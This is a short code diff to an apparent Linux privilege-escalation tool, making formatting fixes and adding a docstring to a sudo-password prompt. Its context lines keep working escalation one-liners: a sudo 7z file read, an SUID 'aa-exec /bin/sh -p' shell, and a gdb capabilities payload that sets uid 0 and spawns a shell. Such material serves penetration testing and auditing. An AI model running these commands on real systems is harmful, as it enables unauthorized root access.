@@ -19,7 +19,7 @@ import time
 import select
 
 # SUDO_BINS_START
-sudo_bins={
+sudo_bins = {
     "7z": [
         "LFILE=file_to_read\nsudo 7z a -ttar -an -so $LFILE | 7z e -ttar -si -so\n"
     ],
@@ -1170,7 +1170,7 @@ sudo_bins={
 # SUDO_BINS_END
 
 # SUID_BINS_START
-suid_bins={
+suid_bins = {
     "aa-exec": [
         "./aa-exec /bin/sh -p"
     ],
@@ -1811,7 +1811,7 @@ suid_bins={
 # SUID_BINS_END
 
 # CAPABILITIES_START
-capabilities={
+capabilities = {
     "gdb": [
         "./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit"
     ],
@@ -2591,6 +2591,11 @@ def parse_arguments():
 
 
 def get_sudo_password():
+    """Securely gets the sudo password from the user.
+
+    Returns:
+        str: sudo password.
+    """
     print("Enter sudo password:")
     return getpass.getpass("> ")
 
